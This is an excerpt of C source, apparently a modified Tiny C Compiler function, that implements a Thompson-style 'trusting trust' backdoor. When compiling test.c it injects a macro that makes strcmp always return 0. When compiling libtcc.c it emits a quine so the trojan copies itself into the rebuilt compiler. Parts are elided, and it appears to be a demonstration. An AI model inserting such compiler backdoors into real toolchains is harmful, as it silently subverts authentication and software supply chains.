...
static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
{
    ...
    if (strcmp(str, "test.c") == 0) {
        ...
        fprintf (temp, "int a() {return 0;}%c#define strcmp(my_val1,my_val2) a()%c",10,10);
        char buf[2];
        buf[1] = 0;
        while(read(fd, buf, 1) > 0) {
            fprintf(temp, "%c", buf[0]);
        }
        fclose(temp);
    ...
    if (strcmp(str, "libtcc.c") == 0) {
        ...
        fprintf (temp, quine, 34,quine,34, 34,34,34,34,34,34,34,34 ,34,34,34,34,34,34,34,34,34,34 ,34,34,34,34,34,34,34,34,34,34 ,34,34,34,34,34,34,34,34,34,34 ,34,34,34,34 ,10,10,10,10 ,34,34 ,10,10 ,34,34);
        while ((read = getline(&line, &len, fp)) != -1) {
